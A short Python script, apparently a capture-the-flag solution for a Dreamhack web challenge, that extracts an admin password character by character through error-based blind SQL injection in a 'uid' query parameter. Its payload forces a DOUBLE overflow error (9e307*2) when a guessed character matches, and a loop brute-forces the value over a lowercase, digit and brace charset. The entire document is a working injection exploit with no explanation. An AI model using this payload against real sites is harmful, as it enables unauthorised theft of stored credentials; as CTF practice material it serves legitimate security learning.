import requests
from string import *

def gen(i, char):
  return f"admin' and (select if(substring(upw, {i}, 1)='{char}', 9e307*2, 0)) = 0;--"

flag = ""
charset = ascii_lowercase + digits + "{}"

while not flag.endswith("}"):
  for c in charset:
    r = requests.get(
      url="http://host3.dreamhack.games:21944/",
      params={"uid": gen(len(flag) + 1, c)}
    )
    if "DOUBLE" in r.text:
      flag += c
      print(flag)
      break